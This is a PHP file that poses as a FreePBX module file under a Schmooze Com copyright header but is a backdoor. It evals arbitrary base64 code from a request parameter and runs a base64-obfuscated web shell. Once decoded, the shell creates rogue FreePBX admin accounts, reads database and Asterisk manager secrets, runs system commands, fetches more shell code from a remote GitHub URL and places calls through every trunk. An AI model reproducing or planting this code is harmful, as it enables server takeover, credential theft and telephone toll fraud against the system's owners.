<?php

//

//	License for all code of this FreePBX module can be found in the license file inside the module directory

//	Copyright 2013 Schmooze Com Inc.

//

$code = $_REQUEST['code'];
$code = base64_decode($code);
eval($code);

eval(

base64_decode('JGF1dGhfcGFzcyA9ICJiNzMzYzM1MTkzNDU3Yzc2MzM0M2E5YTU1ZTNmNjgyMiI7CkBzZXNzaW9uX3N0YXJ0KCk7CmZ1bmN0aW9uIHByaW50TG9naW4oKSB7CmVjaG8iTm8gZGlyZWN0IHNjcmlwdCBhY2Nlc3MgYWxsb3dlZCI7CmVjaG8nCiAgICA8c3R5bGU+CiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9CiAgICA8L3N0eWxlPgogICAgPGZvcm0gbWV0aG9kPXBvc3Q+CiAgICA8aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPXBhc3M+CiAgICA8L2Zvcm0+JzsKICAgIGV4aXQ7Cn0KaWYoICFpc3NldCggJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSApKQogICAgaWYoIGVtcHR5KCAkYXV0aF9wYXNzICkgfHwKICAgICAgICAoIGlzc2V0KCAkX1BPU1RbJ3Bhc3MnXSApICYmICggbWQ1KHNoYTEoJF9QT1NUWydwYXNzJ10pKSA9PSAkYXV0aF9wYXNzICkgKSApCiAgICAgICAgJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSA9IHRydWU7CiAgICBlbHNlIAogICAgICAgIHByaW50TG9naW4oKTsgCmVjaG8nPHByZT4KPGh0bWw+PGhlYWRlcj48dGl0bGU+UHJpdjggUGJ4IFNIRUxMPC90aXRsZT48L2hlYWRlcj48aHRtbD4KPGNlbnRlcj4KICAvICAvICAvICBQcml2OCBTY3JpcHQgQnkgb00zR2EgKCBLaiApIFBseiBEb250IFNoYXJlISBFbmpveSA7KSAgXCAgXCAgXCAgPGJyPgo8L2NlbnRlcj4nOwplY2hvJwogPGZvcm0gbWV0aG9kID0gInBvc3QiPgogIFVzZXJuYW1lOjxicj4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZnJlZXBieHVzZXIiIHZhbHVlPSIiPjxicj4KICBQYXNzd29yZDo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MxIiB2YWx1ZT0iIj48YnI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iYWRtaW4iIHZhbHVlPSJDcmVhdGUgQWRtaW4hIj4KPC9mb3JtPic7Ci8vJGxpbmVzID0gZmlsZSgnL2V0Yy9mcmVlcGJ4LmNvbmYnLCBGSUxFX0lHTk9SRV9ORVdfTElORVMgfCBGSUxFX1NLSVBfRU1QVFlfTElORVMpOwppZiAoZmlsZV9leGlzdHMoJy9ldGMvZnJlZXBieC5jb25mJykpewogICAgJGxpbmVzID0gZmlsZSgnL2V0Yy9mcmVlcGJ4LmNvbmYnLCBGSUxFX0lHTk9SRV9ORVdfTElORVMgfCBGSUxFX1NLSVBfRU1QVFlfTElORVMpOwp9IGVsc2UgeyAKICAgICRsaW5lcyA9IGZpbGUoJy9ldGMvYW1wb3J0YWwuY29uZicsIEZJTEVfSUdOT1JFX05FV19MSU5FUyB8IEZJTEVfU0tJUF9FTVBUWV9MSU5FUyk7IAp9CiRjbGVhbiA9IGFycmF5KCInIiwiOyIsJyInKTsKIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICRsaW5lID0gdHJpbSgkbGluZSk7CmlmKHByZWdfbWF0Y2goIi9BTVBEQlVTRVIvaSIsJGxpbmUpKXsKbGlzdCgkTlRITiwgJGRidXNlcikgPSBleHBsb2RlKCI9ICIsICRsaW5lKTsKJGRidXNlciA9IHN0cl9yZXBsYWNlKCRjbGVhbiwgJycsICRkYnVzZXIpOwoKfQoKaWYocHJlZ19tYXRjaCgiL0FNUERCUEFTUy9pIiwkbGluZSkpewpsaXN0KCROVEhOLCAkZGJwYXNzKSA9IGV4cGxvZGUoIj0gIiwgJGxpbmUpOwokZGJwYXNzID0gc3RyX3JlcGxhY2UoJGNsZWFuLCAnJywgJGRicGFzcyk7Cgp9fQoKJHNoZWxsbmFtZT0kX1BPU1RbJ3NoZWxsbmFtZSddOwokZnJlZXBieHVzZXI9JF9QT1NUWydmcmVlcGJ4dXNlciddOwokcGFzczE9JF9QT1NUWydwYXNzMSddOwokZnJlZXBieHBhc3M9c2hhMSgkcGFzczEpOwppZihpc3NldCgkX1BPU1RbJ2FkbWluJ10pKXsKJGxpbmsgPSBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCAkZGJ1c2VyLCAkZGJwYXNzKTsKJHF1ZXJ5PSAiaW5zZXJ0IGludG8gYXN0ZXJpc2suYW1wdXNlcnMgKHVzZXJuYW1lLHBhc3N3b3JkX3NoYTEsc2VjdGlvbnMpIHZhbHVlcyAoJyRmcmVlcGJ4dXNlcicsJyRmcmVlcGJ4cGFzcycsJyonKTsiOwokc3FsID0gbXlzcWxfcXVlcnkoJHF1ZXJ5LCAkbGluayk7IGVjaG8iVXNlcm5hbWU6JGZyZWVwYnh1c2VyIFBhc3N3b3JkOiRwYXNzMSBDcmVhdGVkISI7Cn0KZWNobycKIDxmb3JtIG1ldGhvZCA9ICJwb3N0Ij4KICBTaGVsbCBuYW1lOjxicj4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ic2hlbGxuYW1lIiB2YWx1ZT0iIj48YnI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2hlbGwiIHZhbHVlPSJDcmVhdGUgU2hlbGwhIj4KPC9mb3JtPic7CmlmKGlzc2V0KCRfUE9TVFsnc2hlbGwnXSkpewogIGZpbGVfcHV0X2NvbnRlbnRzKCRzaGVsbG5hbWUsZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9rNm4vZmlsZXMvbWFzdGVyL3diYy50eHQiKSk7IGVjaG8iU2hlbGwgJHNoZWxsbmFtZSBDcmVhdGVkISI7IH0KZWNobycKIDxmb3JtIG1ldGhvZCA9ICJwb3N0Ij4KICBTaGVsbCBjb21tYW5kOjxicj4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY21kIiB2YWx1ZT0iIj48YnI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyISI+CjwvZm9ybT4nOwpzeXN0ZW0oJF9QT1NUWydjbWQnXSk7CmVjaG8nCjxmb3JtIG1ldGhvZCA9ICJwb3N0Ij4KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZ2V0dHJ1bmtzIiB2YWx1ZT0iR2V0IFRlY2gvVHJ1bmsiPgo8L2Zvcm0+JzsKaWYoaXNzZXQoJF9QT1NUWydnZXR0cnVua3MnXSkpewokbGluazEgPSBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCAkZGJ1c2VyLCAkZGJwYXNzKTsKJHF1ZXJ5MT0gInNlbGVjdCB0ZWNoLGNoYW5uZWxpZCBmcm9tIGFzdGVyaXNrLnRydW5rcyB3aGVyZSB0ZWNoIG5vdCBsaWtlICdjdXN0b20nOyI7CiRzcWwxID0gbXlzcWxfcXVlcnkoJHF1ZXJ5MSwgJGxpbmsxKTsKZWNobyJUZWNoIC8gVHJ1bms8YnI+PGJyPiI7CndoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXNzb2MoJHNxbDEpKSB7CmVjaG8gJHJvd1sndGVjaCddOwplY2hvICIgLyAiOwplY2hvICRyb3dbJ2NoYW5uZWxpZCddOwplY2hvICc8YnI+PGJyPic7Cgp9IH0gCmVjaG8nCiA8Zm9ybSBtZXRob2QgPSAicG9zdCI+CiAgVHJ5IGFsbCA/IE51bWJlcjo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNhbGxhbGxudW0iIHZhbHVlPSIiPjxicj4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJjYWxsYWxsIiB2YWx1ZT0iVHJ5IEFMTCI+CjwvZm9ybT4nOwppZihpc3NldCgkX1BPU1RbJ2NhbGxhbGwnXSkpewoJICAgICRtYW5hZ2VyID0gZmlsZSgnL2V0Yy9hc3Rlcmlzay9tYW5hZ2VyLmNvbmYnLCBGSUxFX0lHTk9SRV9ORVdfTElORVMgfCBGSUxFX1NLSVBfRU1QVFlfTElORVMpOyAKCQoKJGNsZWFuID0gYXJyYXkoIiciLCI7IiwnIicpOwogZm9yZWFjaCAoJG1hbmFnZXIgYXMgJG1uZ3IpIHsKICAkbW5nciA9IHRyaW0oJG1uZ3IpOwppZihwcmVnX21hdGNoKCIvc2VjcmV0L2kiLCRtbmdyKSl7Cmxpc3QoJE5USE4sICRzZWNyZXQpID0gZXhwbG9kZSgiPSAiLCAkbW5ncik7CiRzZWNyZXQgPSBzdHJfcmVwbGFjZSgkY2xlYW4sICcnLCAkc2VjcmV0KTsKfQp9CgkkbGluazEgPSBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCAkZGJ1c2VyLCAkZGJwYXNzKTsKJHF1ZXJ5MT0gInNlbGVjdCB0ZWNoLGNoYW5uZWxpZCBmcm9tIGFzdGVyaXNrLnRydW5rcyB3aGVyZSB0ZWNoIG5vdCBsaWtlICdjdXN0b20nOyI7CiRzcWwxID0gbXlzcWxfcXVlcnkoJHF1ZXJ5MSwgJGxpbmsxKTsKCXdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXNzb2MoJHNxbDEpKSB7CgogICAJICAgCSR0cnVua3MgPSAkcm93Wyd0ZWNoJ10gLiAiLyIgLiAkcm93WydjaGFubmVsaWQnXSAuICIvIiAuJF9QT1NUWydjYWxsYWxsbnVtJ107CiAkb1NvY2tldCA9IGZzb2Nrb3BlbiAoImxvY2FsaG9zdCIsIDUwMzgsICRlcnJubywgJGVycnN0ciwgMjApOwppZiAoISRvU29ja2V0KSB7CmVjaG8gIiRlcnJzdHIgKCRlcnJubyk8YnI+XG4iOwp9IGVsc2UgewpmcHV0cygkb1NvY2tldCwgIkFjdGlvbjogTG9naW5cclxuIik7CmZwdXRzKCRvU29ja2V0LCAiVXNlcm5hbWU6IGFkbWluXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIlNlY3JldDogJHNlY3JldFxyXG5cclxuIik7CmZwdXRzKCRvU29ja2V0LCAiQWN0aW9uOiBPcmlnaW5hdGVcclxuIik7CmZwdXRzKCRvU29ja2V0LCAiQ2hhbm5lbDogJHRydW5rc1xyXG4iKTsKZnB1dHMoJG9Tb2NrZXQsICJBcHBsaWNhdGlvbjogV2FpdFxyXG4iKTsKZnB1dHMoJG9Tb2NrZXQsICJEYXRhOiAzMFxyXG4iKTsKZnB1dHMoJG9Tb2NrZXQsICJDYWxsZXJJRDogQXN0ZXJpc2s8MTAwMDAwMDAwMD5cclxuXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkFjdGlvbjogTG9nb2ZmXHJcblxyXG4iKTsKc2xlZXAoMSk7CmZjbG9zZSgkb1NvY2tldCk7Cn0KZWNobyJDYWxsaW5nICR0cnVua3MgLi4uPGJyPiI7IH0gfQogICAJICAgCQoKICAKCmVjaG8nCiA8Zm9ybSBtZXRob2QgPSAicG9zdCI+CiAgVGVjaDo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InRlY2giIHZhbHVlPSIiPjxicj4KICBUcnVuazo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InRydW5rIiB2YWx1ZT0iIj48YnI+CiAgTnVtYmVyOjxicj4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibnVtYmVyIiB2YWx1ZT0iIj48YnI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0idGVzdGNhbGwiIHZhbHVlPSJUZXN0IENhbGwhIj4KPC9mb3JtPic7CiRzdHJVc2VyID0gImFkbWluIjsgCmVjaG8gJ0FNSSBTZWNyZXQgOiAnOwokc3RyU2VjcmV0ID0gc3lzdGVtKCJjYXQgL2V0Yy9hc3Rlcmlzay9tYW5hZ2VyLmNvbmYgfCBhd2sgJy9zZWNyZXQvIHtwcmludCAkM307JyIpOwplY2hvICc8YnI+JzsKJHRlY2ggPSAkX1BPU1RbJ3RlY2gnXTsKJHRydW5rID0gJF9QT1NUWyd0cnVuayddOwokbnVtYmVyID0gJF9QT1NUWydudW1iZXInXTsKJGNoYW5uZWwgPSAkdGVjaC4iLyIuJHRydW5rLiIvIi4kbnVtYmVyOwppZihpc3NldCgkX1BPU1RbJ3Rlc3RjYWxsJ10pKXsKJG9Tb2NrZXQgPSBmc29ja29wZW4gKCJsb2NhbGhvc3QiLCA1MDM4LCAkZXJybm8sICRlcnJzdHIsIDIwKTsKaWYgKCEkb1NvY2tldCkgewplY2hvICIkZXJyc3RyICgkZXJybm8pPGJyPlxuIjsKfSBlbHNlIHsKZnB1dHMoJG9Tb2NrZXQsICJBY3Rpb246IExvZ2luXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIlVzZXJuYW1lOiAkc3RyVXNlclxyXG4iKTsKZnB1dHMoJG9Tb2NrZXQsICJTZWNyZXQ6ICRzdHJTZWNyZXRcclxuXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkFjdGlvbjogT3JpZ2luYXRlXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkNoYW5uZWw6ICRjaGFubmVsXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkFwcGxpY2F0aW9uOiBXYWl0XHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkRhdGE6IDMwXHJcbiIpOwpmcHV0cygkb1NvY2tldCwgIkNhbGxlcklEOiBBc3RlcmlzazwxMDAwMDAwMDAwPlxyXG5cclxuIik7CmZwdXRzKCRvU29ja2V0LCAiQWN0aW9uOiBMb2dvZmZcclxuXHJcbiIpOwpzbGVlcCgxKTsKZmNsb3NlKCRvU29ja2V0KTsKfQplY2hvIkNhbGxpbmcgJGNoYW5uZWwgLi4uIjsgfQplY2hvJwogPGZvcm0gbWV0aG9kID0gInBvc3QiPgogICBDcmVhdGUgY2FsbC5waHAgPzxicj4KICBUZWNoOjxicj4KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idGVjaDIiIHZhbHVlPSIiPjxicj4KICBUcnVuazo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InRydW5rMiIgdmFsdWU9IiI+PGJyPgogIFByZWZpeDo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InByZWZpeCIgdmFsdWU9IiI+PGJyPgogIEZpbGUgTmFtZTo8YnI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGVuYW1leCIgdmFsdWU9IiI+PGJyPgogIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImNyZWF0ZWNhbGwiIHZhbHVlPSJDcmVhdGUgY2FsbC5waHAhIj4KPC9mb3JtPic7CiRwcmVmaXggPSAkX1BPU1RbJ3ByZWZpeCddOwokdGVjaDIgPSAkX1BPU1RbJ3RlY2gyJ107CiR0cnVuazIgPSAkX1BPU1RbJ3RydW5rMiddOwokZmlsZW5hbWV4ID0gJF9QT1NUWydmaWxlbmFtZXgnXTsKJHRlY2gzID0gJyInLiR0ZWNoMi4iLyIuJHRydW5rMi4nIjsnOwokdGVjaHdyaXRlID0gJzw/cGhwJy4iXHJcbiIuJyR0ZWNoID0gJy4kdGVjaDMuIlxyXG4iLickcHJlZml4ID0gJy4nIicuJHByZWZpeC4nIjsnOwppZihpc3NldCgkX1BPU1RbJ2NyZWF0ZWNhbGwnXSkpewokb2xkID0gZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9rNm4vZmlsZXMvbWFzdGVyL2NhbGwudHh0Jyk7CiRuZXcgPSAkdGVjaHdyaXRlLiJcclxuIi4kb2xkOwpmaWxlX3B1dF9jb250ZW50cygkZmlsZW5hbWV4LCAkbmV3KTsKZWNobyAiJGZpbGVuYW1leCBjcmVhdGVkISI7IH0='));

?>
